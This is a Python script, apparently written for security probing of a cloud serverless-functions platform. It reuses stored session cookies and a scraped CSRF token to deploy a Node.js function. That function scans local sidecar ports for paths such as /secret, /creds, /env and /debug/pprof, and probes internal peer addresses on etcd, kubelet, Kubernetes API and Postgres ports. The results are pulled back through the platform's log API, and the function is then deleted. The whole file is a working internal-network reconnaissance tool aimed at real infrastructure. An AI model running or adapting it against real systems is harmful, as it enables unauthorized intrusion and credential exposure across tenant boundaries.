# -*- coding: utf-8 -*-
"""函数运行时探测 #3:sidecar API 路由字典 + 对端网关 + otel TLS"""
import http.client, ssl, json, re, html, os, sys, time, io, zipfile, uuid

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST, cookie_str

ctxj = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_ctx.json')))
PID, BID = ctxj['pid'], ctxj['bid']

def ctl_req(method, path, body=None, ctype='application/json', raw_body=None):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    conn.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r = conn.getresponse()
    r.read()
    fresh = {}
    for sc in r.headers.get_all('Set-Cookie') or []:
        m = re.match(r'([^=]+)=([^;]*)', sc)
        if m:
            fresh[m.group(1)] = m.group(2)
    conn.close()
    conn2 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    conn2.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r2 = conn2.getresponse()
    txt = r2.read().decode('utf-8', 'replace')
    conn2.close()
    m = re.search(r'<meta name="csrf-token" content="([^"]+)"', txt)
    csrf = html.unescape(m.group(1)) if m else None
    parts = []
    for c in cookie_str().split(';'):
        c = c.strip()
        if c.startswith('_gorilla_csrf=') and '_gorilla_csrf' in fresh:
            parts.append('_gorilla_csrf=' + fresh['_gorilla_csrf'])
        else:
            parts.append(c)
    conn3 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    hdrs = {'Cookie': '; '.join(parts), 'User-Agent': 'Mozilla/5.0'}
    hdrs.update(HEADERS_TEST)
    if ctype:
        hdrs['Content-Type'] = ctype
    if csrf:
        hdrs['X-CSRF-Token'] = csrf
    data = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn3.request(method, path, body=data, headers=hdrs)
    r3 = conn3.getresponse()
    out = r3.read().decode('utf-8', 'ignore')
    conn3.close()
    return r3.status, out

PROBE = r'''const sleep = (ms) => new Promise(r => setTimeout(r, ms));
async function t(url, ms, opts) {
  try {
    const r = await fetch(url, Object.assign({ signal: AbortSignal.timeout(ms), redirect: 'manual' }, opts || {}));
    const tx = await r.text();
    return r.status + ' ct=' + (r.headers.get('content-type') || '-') + ' ' + tx.slice(0, 300).replace(/\s+/g, ' ');
  } catch (e) { return 'ERR ' + (e && e.message ? e.message : e); }
}
async function probe() {
  const e = process.env;
  // [1] sidecar 路由字典: 8081(DATA) / 8082(LOAD)
  const paths = ['/health', '/healthz', '/ready', '/metrics', '/env', '/config', '/v1', '/v2', '/api',
    '/status', '/version', '/info', '/debug', '/admin', '/internal', '/function', '/functions',
    '/code', '/src', '/app', '/zip', '/mount', '/fs', '/list', '/files', '/download', '/upload',
    '/pg', '/postgres', '/proxy', '/invoke', '/invocations', '/request', '/socket', '/ws',
    '/otel', '/telemetry', '/log', '/logs', '/auth', '/token', '/secret', '/creds', '/credentials',
    '/storage', '/s3', '/buckets', '/load', '/data', '/db', '/sql', '/query', '/healthcheck',
    '/robots.txt', '/.well-known/health', '/readyz', '/livez', '/__health', '/_health', '/ping',
    '/favicon.ico', '/metrics.json', '/debug/pprof/', '/debug/vars', '/debug/pprof/cmdline'];
  for (const port of [8081, 8082]) {
    for (const p of paths) {
      const r = await t('http://127.0.0.1:' + port + p, 2500);
      if (!r.startsWith('404') && !r.startsWith('ERR') && !r.startsWith('405')) {
        console.log('P3 port' + port + ' ' + p + ' => ' + r);
      }
      if (r.startsWith('405')) console.log('P3 port' + port + ' ' + p + ' => ' + r);
    }
    // 方法变体
    for (const m of ['POST', 'OPTIONS', 'PUT', 'DELETE']) {
      console.log('P3 port' + port + ' ' + m + ' / => ' + await t('http://127.0.0.1:' + port + '/', 2500, { method: m }));
    }
  }
  // [2] 对端 192.168.221.14 网关探测(谨慎:仅 TCP/HTTP 浅探)
  for (const port of [80, 443, 8080, 8081, 8082, 3000, 5432, 2379, 2380, 6443, 9000, 9100, 10250]) {
    console.log('P3 peer 192.168.221.14:' + port + ' => ' + await t('http://192.168.221.14:' + port + '/', 2000));
  }
  // 邻居 .0-.30 同段(仅 80/8082 浅探, 看是否容器共享段)
  for (let i = 0; i <= 30; i++) {
    if (i === 14 || i === 15) continue;
    const r = await t('http://192.168.221.' + i + ':8082/', 800);
    if (!r.startsWith('ERR')) console.log('P3 nbr 192.168.221.' + i + ':8082 => ' + r);
  }
  // [3] otel https 识别
  console.log('P3 otel-https => ' + await t('https://otel.c-1.us-east-2.aws.neon.build:443/', 5000));
  console.log('P3 otel-http => ' + await t('http://otel.c-1.us-east-2.aws.neon.build:4318/', 5000));
  console.log('P3 done');
}
probe();
export default { fetch: async (req) => new Response('ok') };
'''

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.js', PROBE)
    z.writestr('package.json', '{"name":"probe3","type":"module","main":"index.js"}')
buf.seek(0)
zip_bytes = buf.read()

SLUG = 'secprb3' + uuid.uuid4().hex[:6]
FP = '/projects/%s/branches/%s/functions' % (PID, BID)
boundary = '----b' + uuid.uuid4().hex
body = (('--' + boundary + '\r\nContent-Disposition: form-data; name="zip"; filename="b.zip"\r\nContent-Type: application/zip\r\n\r\n').encode()
        + zip_bytes + b'\r\n'
        + ('--' + boundary + '\r\nContent-Disposition: form-data; name="runtime"\r\n\r\nnodejs24\r\n').encode()
        + ('--' + boundary + '--\r\n').encode())
st, raw = ctl_req('POST', API_BASE + FP + '/' + SLUG + '/deployments', None,
                  ctype='multipart/form-data; boundary=' + boundary, raw_body=body)
print('deploy -> %d %s' % (st, raw[:200]), flush=True)

seen = set()
t0 = time.time()
while time.time() - t0 < 150:
    time.sleep(5)
    st2, raw2 = ctl_req('POST', API_BASE + '/projects/%s/branches/%s/logs/query' % (PID, BID),
                        {'since': '5m', 'body_contains': 'P3 '})
    try:
        for lg in json.loads(raw2).get('logs', []):
            msg = lg.get('message') or lg.get('line') or str(lg)
            if isinstance(msg, str) and msg.startswith('P3 ') and msg not in seen:
                seen.add(msg)
                print('LOG: %s' % msg[:500], flush=True)
    except Exception:
        pass
    if 'P3 done' in ' '.join(seen):
        break
print('rows:', len(seen), flush=True)

st, raw = ctl_req('DELETE', API_BASE + FP + '/' + SLUG)
print('cleanup -> %d' % st, flush=True)
